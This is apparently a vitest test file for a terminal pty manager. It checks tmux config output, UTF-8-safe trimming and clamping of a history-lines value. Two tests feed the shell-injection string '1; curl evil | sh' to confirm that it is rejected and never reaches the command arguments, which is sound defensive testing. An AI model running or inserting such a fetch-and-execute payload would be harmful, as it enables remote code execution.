import { describe, it, expect, vi, beforeEach } from 'vitest'

// captureHistory shells out through promisify(execFile) — capture the argv it builds so we can
// prove a hostile `lines` value never reaches the command string.
const execFileCalls: Array<{ file: string; args: string[] }> = []
vi.mock('child_process', () => ({
  execFile: (file: string, args: string[], _opts: unknown, cb: (e: unknown, r: unknown) => void) => {
    execFileCalls.push({ file, args })
    cb(null, { stdout: '', stderr: '' })
  },
  execFileSync: () => ''
}))

import { tmuxConf, trimToBytes, clampHistoryLines, PtyManager } from './pty-manager'

describe('tmuxConf', () => {
  const c = tmuxConf(50000)
  it('leaves the mouse off so drags are xterm\'s own selection', () => {
    expect(c).toContain('set -g mouse off')
    expect(c).not.toContain('set -g mouse on')
  })
  it('binds no mouse keys and no longer shells out to pbcopy', () => {
    expect(c).not.toContain('MouseDragEnd1Pane')
    expect(c).not.toContain('copy-pipe-and-cancel')
    expect(c).not.toContain('pbcopy')
  })
  it('keeps OSC 52 as a safety net for apps that emit it themselves', () => {
    expect(c).toContain('set -g set-clipboard on')
  })
  it('floors history-limit at 1000', () => {
    expect(tmuxConf(10)).toContain('set -g history-limit 1000')
  })
})

describe('trimToBytes', () => {
  it('returns the text untouched when it is under the cap', () => {
    expect(trimToBytes('hello', 1024)).toBe('hello')
  })
  it('trims from the HEAD (the oldest lines go first)', () => {
    const out = trimToBytes('aaaa\nbbbb\ncccc\n', 10)
    expect(out.endsWith('cccc\n')).toBe(true)
    expect(out).not.toContain('aaaa')
    expect(Buffer.byteLength(out, 'utf-8')).toBeLessThanOrEqual(10)
  })
  it('never splits a 2-byte character (cap lands mid-character)', () => {
    // 'ü' is 2 bytes; a cap of 9 slices the 100-byte buffer mid-character.
    const out = trimToBytes('ü'.repeat(50), 9)
    expect(out).not.toContain('�')
    expect(Buffer.byteLength(out, 'utf-8')).toBeLessThanOrEqual(9)
  })
  it('never splits a 4-byte character (cap lands mid-character)', () => {
    const out = trimToBytes('😀'.repeat(20), 11)
    expect(out).not.toContain('�')
    expect(Buffer.byteLength(out, 'utf-8')).toBeLessThanOrEqual(11)
  })
  it('honours the cap and stays clean on the no-newline path with multi-byte text', () => {
    for (const cap of [1, 2, 3, 5, 7, 9, 11, 13]) {
      const out = trimToBytes('aü😀b'.repeat(30), cap)
      expect(out, `cap=${cap}`).not.toContain('�')
      expect(Buffer.byteLength(out, 'utf-8'), `cap=${cap}`).toBeLessThanOrEqual(cap)
    }
  })
  it('keeps the newest content when there is no newline at all', () => {
    const out = trimToBytes('abcdefghij', 4)
    expect(out).toBe('ghij')
  })
})

describe('clampHistoryLines', () => {
  it('keeps a sane request', () => {
    expect(clampHistoryLines(200)).toBe(200)
  })
  it('caps at the history ceiling and floors at 1', () => {
    expect(clampHistoryLines(10_000_000)).toBe(5000)
    expect(clampHistoryLines(-5)).toBe(1)
    expect(clampHistoryLines(0)).toBe(5000) // falsy → default
  })
  it('rejects non-numeric / hostile input', () => {
    expect(clampHistoryLines('1; curl evil | sh' as unknown as number)).toBe(5000)
    expect(clampHistoryLines(NaN)).toBe(5000)
    expect(clampHistoryLines(undefined as unknown as number)).toBe(5000)
    expect(clampHistoryLines(12.9)).toBe(12)
  })
})

describe('PtyManager.captureHistory (untrusted `lines`)', () => {
  beforeEach(() => {
    execFileCalls.length = 0
  })
  const withTmux = (): PtyManager => {
    const pm = new PtyManager()
    ;(pm as unknown as { tmuxPath: string }).tmuxPath = '/usr/bin/tmux'
    return pm
  }

  it('never lets a shell-injection payload reach the tmux argv', async () => {
    await withTmux().captureHistory('n1', '1; curl evil | sh' as unknown as number)
    const argv = execFileCalls[0].args.join(' ')
    expect(argv).not.toContain('curl')
    expect(argv).not.toContain(';')
    expect(argv).toContain('-S')
    expect(execFileCalls[0].args).toContain('-5000')
  })

  it('clamps negative / NaN / oversized values to a sane integer', async () => {
    const pm = withTmux()
    await pm.captureHistory('n1', -1)
    expect(execFileCalls[0].args).toContain('-1')
    await pm.captureHistory('n1', NaN)
    expect(execFileCalls[1].args).toContain('-5000')
    await pm.captureHistory('n1', 10_000_000)
    expect(execFileCalls[2].args).toContain('-5000')
  })
})
